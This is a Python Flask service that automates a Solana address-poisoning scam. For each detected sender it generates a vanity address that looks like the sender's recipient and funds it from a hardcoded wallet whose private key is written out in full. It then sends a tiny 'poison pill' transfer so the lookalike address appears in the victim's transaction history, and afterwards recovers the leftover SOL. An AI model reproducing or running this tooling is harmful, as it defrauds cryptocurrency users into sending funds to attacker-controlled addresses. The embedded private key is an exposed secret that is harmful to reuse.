import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "vanitygenerator")))
from soltransfer.sol_xfr import send_sol
import time
from vanitygenerator.generatekeys import generate_similar_address
import base58
import json
import logging
import threading
from solana.rpc.api import Client
from solders.pubkey import Pubkey

# Flask imports
from flask import Flask, request, jsonify

funderpubkey = "RAPEWkHm8YZJ6ECeaasbJdUp7E3XsxVYvLvHqCPSbT1"
funderprivkey = "2YVpmDaVDv1tMEREMUSPVL4io6WKJ2yvKZdoaJTRF36qv7Knd8jARhN9Qs3o65nUbJHLRzwdXaR37GqMVjpxjDZ5"
rpc_url = "http://frankfurt.rpc.pinnaclenode.com"
initial_fund = 0.001000000
poison_pill = 0.00001
min_gas = 0.000005000
cu_prc   = 0
cu_lmt   = 250000

gpu_lock = threading.Lock()

def safe_send_sol(*args, **kwargs):
    max_retries = 3
    delay = 2
    for attempt in range(1, max_retries + 1):
        try:
            return send_sol(*args, **kwargs)
        except Exception as e:
            logging.error(f"Attempt {attempt}: Error sending SOL: {e}")
            if attempt < max_retries:
                time.sleep(delay)
                delay *= 2
            else:
                logging.error(f"All {max_retries} attempts failed for send_sol with args: {args}, kwargs: {kwargs}")
                return None

def poison(detectedsender, detectedreceiver):
    with gpu_lock:
        similar_address = generate_similar_address(detectedreceiver)
        print(f"Generated address: {similar_address} to poison {detectedsender} who sent funds to {detectedreceiver}")
        with open("generated_wallets.jsonl", "a") as f:
            json.dump(similar_address, f)
            f.write("\n")
    #send sol from our funder to the similar address
    safe_send_sol(funderpubkey, funderprivkey, similar_address["public_key"], initial_fund, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"funded {similar_address['public_key']}")
    #send sol from the similar address to the detected sender
    safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), detectedsender, poison_pill, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(10)
    print(f"Poisoned {detectedsender} with {similar_address['public_key']}")
    #return the rent amount back to the funder
    safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey,  initial_fund-poison_pill-min_gas*2, cu_prc, cu_lmt, rpc_url, 'Y')
    time.sleep(12)
    #check if similar address has any sol balance
    LAMPORTS_PER_SOL = 1_000_000_000
    client = Client(rpc_url)
    pubkey = Pubkey.from_string(similar_address["public_key"])
    resp = client.get_balance(pubkey)
    sol_balance = resp.value / LAMPORTS_PER_SOL
    print(f"Similar address {similar_address['public_key']} has {sol_balance} SOL balance now")
    if sol_balance > min_gas:
        # send remaining balance minus min_gas back to funder
        safe_send_sol(similar_address["public_key"], base58.b58encode(bytes(similar_address["private_key_array"])).decode(), funderpubkey, sol_balance - min_gas, cu_prc, cu_lmt, rpc_url, 'Y')
        print(f"Retrying remaining balance {sol_balance - min_gas} SOL from {similar_address['public_key']} to {funderpubkey}")
    print(f"Returned rent to {funderpubkey}")

# Flask app setup
app = Flask(__name__)

@app.route('/poison', methods=['POST'])
def poison_endpoint():
    data = request.get_json()
    detectedsender = data.get('detectedsender')
    detectedreceiver = data.get('detectedreceiver')
    if not detectedsender or not detectedreceiver:
        return jsonify({'error': 'Missing parameters'}), 400
    try:
        poison(detectedsender, detectedreceiver)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == "__main__":
    app.run(host='127.0.0.1', port=5001, threaded=True)
